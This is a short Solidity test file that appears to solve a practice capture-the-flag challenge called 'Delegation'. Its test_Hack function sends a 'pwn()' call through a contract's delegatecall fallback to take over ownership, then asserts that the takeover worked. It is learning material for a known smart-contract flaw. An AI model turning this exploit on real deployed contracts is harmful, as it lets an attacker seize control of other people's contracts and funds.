// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Delegate, Delegation} from "../src/delegate/Delegate.sol";
import {Test, console2} from "forge-std/Test.sol";
import "../src/account.sol";


contract DelegateTest is Test {
    Delegate public delegate;
    Delegation public delegation;

    function setUp() public {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
        assertEq(delegation.owner(), address(this));

    }

    function test_Hack() public {
        vm.startBroadcast(account.ACC_PRIVATE_KEY_0);
        (bool success, bytes memory message) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        if (!success) {
            revert(string(message));
        }
        assertEq(delegation.owner(), account.ACC_0);
    }
}
